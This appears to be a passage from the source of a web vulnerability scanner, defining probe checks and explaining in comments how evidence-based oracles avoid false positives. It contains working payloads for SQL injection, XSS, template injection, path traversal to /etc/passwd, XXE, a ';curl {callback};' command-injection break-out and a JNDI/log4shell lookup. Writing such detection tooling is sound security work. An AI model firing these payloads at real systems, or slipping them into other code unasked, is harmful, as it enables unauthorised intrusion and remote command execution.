    benign="crucible-benign-term",
    probe_payload="x' OR '1'='1",
)

REFLECTED_XSS = MarkerReflectionCheck(
    id="reflected-xss", bug_class="xss",
    payload_template="\"'><x{marker}>",
)

# SSTI / path-traversal / error-based used to be MarkerReflectionCheck probes that
# confirmed on bare canary REFLECTION — but reflecting a canary only proves input
# is echoed (an XSS signal, already covered by REFLECTED_XSS), NOT that a template
# was evaluated, a file was read, or a datastore errored. On any endpoint that
# reflects input verbatim (a search box, an echo, an error page) all three fired as
# FALSE POSITIVES — the benchmark app only dodged this by reflecting solely
# markup-shaped input. These now use the evidence-carrying oracles: SSTI confirms
# only when the server COMPUTED the arithmetic (result present, raw absent),
# path-traversal only when the target file's CONTENT appears, error-based only when
# a datastore error appears in the probe but not the benign control. Prove, don't
# guess — a reflecting endpoint no longer trips any of the three.
SSTI_EVAL_BRACES = EvaluationCheck(
    id="ssti-eval-braces", bug_class="ssti",
    probe_expr="{{7331*7331}}", expected_result="53743561",
)

SSTI_EVAL_DOLLAR = EvaluationCheck(
    id="ssti-eval-dollar", bug_class="ssti",
    probe_expr="${7331*7331}", expected_result="53743561",
)

PATH_TRAVERSAL = ContentSignatureCheck(
    id="path-traversal", bug_class="path_traversal",
    payload="../../../../etc/passwd", signature="root:x:0:0:",
)

ERROR_BASED = ErrorSignatureCheck(
    id="error-based-injection", bug_class="error_based_sqli",
)


# --- out-of-band (blind) checks: confirmed by a callback, not a response ----

SSRF_OOB = OOBCheck(
    id="ssrf-oob", bug_class="ssrf",
    # a bare callback URL: a server-side fetch of it is the interaction
    payload_template="{callback}",
)

XXE_OOB = OOBCheck(
    id="xxe-oob", bug_class="blind_xxe",
    # external general entity that dereferences the callback on parse
    payload_template=(
        "<?xml version=\"1.0\"?>"
        "<!DOCTYPE r [<!ENTITY x SYSTEM \"{callback}\">]><r>&x;</r>"
    ),
)

RCE_OOB = OOBCheck(
    id="rce-oob", bug_class="command_injection",
    # a command-injection break-out that curls the callback (blind OS cmdi)
    payload_template=";curl {callback};",
)

DESERIALIZATION_OOB = OOBCheck(
    id="deserialization-oob", bug_class="deserialization",
    # JNDI/log4shell-style lookup: dereferenced during unsafe deserialization
    payload_template="${{jndi:ldap://{callback}}}",
)


# Open redirect: an evidence-carrying point check (fires only on a real redirect
# to the canary host), safe to run everywhere — the targeting selector still
# prioritises redirect-ish params.
OPEN_REDIRECT = OpenRedirectCheck()

DEFAULT_CHECKS: tuple[Check, ...] = (
    BOOLEAN_SQLI,
    REFLECTED_XSS,
    SSTI_EVAL_BRACES,
    SSTI_EVAL_DOLLAR,
    PATH_TRAVERSAL,
    ERROR_BASED,
    OPEN_REDIRECT,
    SSRF_OOB,
    XXE_OOB,
    RCE_OOB,
    DESERIALIZATION_OOB,
)
"""A ready-to-run seed set. Every check maps to a bug_class the verifier already
routes to an oracle, so it confirms end-to-end. The OOB checks (`wants_oob`) run
only when the engine has an OOBReceiver — without one they are skipped, never
guessed. Extend by declaring more DifferentialCheck / MarkerReflectionCheck /
OOBCheck entries — no new oracle needed."""
